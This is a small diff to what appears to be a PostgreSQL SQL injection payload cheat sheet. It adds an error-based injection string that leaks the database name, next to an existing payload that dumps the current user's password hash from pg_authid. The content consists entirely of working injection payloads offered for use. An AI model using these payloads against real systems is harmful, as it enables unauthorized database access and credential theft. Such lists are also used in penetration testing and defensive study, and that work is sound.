@@ -134,6 +134,12 @@ Dump password hash
 ' AND 1=CAST((SELECT rolpassword FROM pg_authid WHERE rolname=current_user) AS INT) -- 
 ```
 
+Get database name
+
+```
+' AND 1=CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET 0) AS INT) -- 
+```
+
 #### PostgreSQL Hash
 
 ```
